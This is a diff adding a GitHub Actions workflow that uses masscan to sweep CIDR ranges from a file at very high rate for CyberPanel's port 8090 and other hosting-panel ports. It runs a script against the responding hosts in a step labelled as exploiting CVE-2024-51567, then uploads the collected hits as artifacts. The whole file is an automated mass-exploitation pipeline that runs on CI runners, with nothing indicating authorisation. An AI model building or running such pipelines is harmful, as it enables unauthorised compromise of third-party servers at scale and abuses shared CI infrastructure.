@@ -1,0 +1,45 @@
+name: vpspanel
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq masscan
+          pip install -q requests
+      - name: masscan cyberpanel 8090
+        run: |
+          sudo masscan -iL cidrs.txt -p8090 --rate 100000 -oL cp.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' cp.txt | sort -u > cp_hosts.txt
+          echo "=== 8090 open: $(wc -l < cp_hosts.txt) ==="
+          head -5 cp_hosts.txt
+      - name: exploit CVE-2024-51567
+        run: python3 vps_panel.py cp_hosts.txt || true
+      - name: save cp result
+        if: always()
+        run: cp /tmp/vps_panel_result.json cp_result.json 2>/dev/null || true
+      - name: masscan other panels
+        run: |
+          sudo masscan -iL cidrs.txt -p2030,2031,8888,8443,8083,8000,9000,9443 --rate 100000 -oL p2.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' p2.txt | sort -u > p2_hosts.txt
+          echo "=== panel ports open: $(wc -l < p2_hosts.txt) ==="
+      - name: fingerprint panels
+        run: python3 vps_panel.py p2_hosts.txt || true
+      - name: save p2 result
+        if: always()
+        run: cp /tmp/vps_panel_result.json p2_result.json 2>/dev/null || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: vpspanel-results
+          path: |
+            cp_result.json
+            p2_result.json
+            /tmp/vps_panel_hits.jsonl
+            cp_hosts.txt
+            p2_hosts.txt
+          if-no-files-found: warn
